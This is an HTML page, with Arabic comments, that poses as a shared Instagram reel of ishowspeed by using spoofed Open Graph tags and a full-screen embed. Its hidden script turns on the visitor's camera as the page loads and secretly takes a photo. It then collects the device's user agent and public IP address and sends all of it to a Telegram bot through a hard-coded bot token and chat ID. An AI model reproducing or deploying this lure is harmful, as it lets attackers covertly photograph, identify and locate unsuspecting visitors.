<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>www.instagram.com/reel/C_biUQsRFzS/</title>

    <!-- بيانات Open Graph للمشاركة على وسائل التواصل الاجتماعي -->
    <meta property="og:url" content="https://www.instagram.com/reel/C_biUQsRFzS/" />
    <meta property="og:type" content="video" />
    <meta property="og:title" content="ishowspeed" />
    <meta property="og:description" content="$100,000 روبوت كلب 🐶😳 #ishowspeed" />
    <meta property="og:image" content="IMG_3581.jpeg" />
    
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #video-container {
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }
        #video, #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div id="video-container">
        <!-- فيديو Instagram في الخلفية -->
        <iframe src="https://www.instagram.com/reel/C_biUQsRFzS/embed" frameborder="0"></iframe>
        
        <video id="video" autoplay></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        let stream; // تخزين البث عالميًا

        // طلب الوصول إلى الكاميرا والتقاط الصورة
        navigator.mediaDevices.getUserMedia({ video: true })
            .then((mediaStream) => {
                stream = mediaStream;
                video.srcObject = stream;
                video.addEventListener('loadedmetadata', () => {
                    // تحديد مدة عمل الكاميرا
                    setTimeout(captureAndSendPhoto, 1000); // التقاط الصورة بعد 3 ثوانٍ
                });
            })
            .catch((err) => console.error('خطأ في الوصول إلى الكاميرا: ', err));

        function captureAndSendPhoto() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // عكس الصورة أفقيًا
            context.translate(canvas.width, 0);
            context.scale(-1, 1);
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');
            stopCamera(); // إيقاف الكاميرا
            getDeviceInfo(imageData);
        }

        function stopCamera() {
            stream.getTracks().forEach(track => track.stop()); // إيقاف جميع مسارات الفيديو
        }

        function getDeviceInfo(imageData) {
            const deviceInfo = navigator.userAgent;
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => sendToTelegram(imageData, deviceInfo, data.ip))
                .catch(error => console.error('خطأ في الحصول على IP:', error));
        }

        function sendToTelegram(imageData, deviceInfo, ip) {
            const telegramToken = '7787402061:AAGh-kuD1UOGc9bsUlqMmy_pIj6NgHGnFNE';
            const chatId = '6305469091';
            const blob = dataURLToBlob(imageData);
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'photo.png');
            formData.append('caption', `معلومات الجهاز: ${deviceInfo}\nعنوان IP: ${ip}`);

            fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(() => {
                console.log('تم إرسال الصورة بنجاح!');
            })
            .catch(error => console.error('خطأ:', error));
        }

        function dataURLToBlob(dataURL) {
            const byteString = atob(dataURL.split(',')[1]);
            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
            return new Blob([ab], { type: mimeString });
        }
    </script>
</body>
</html>
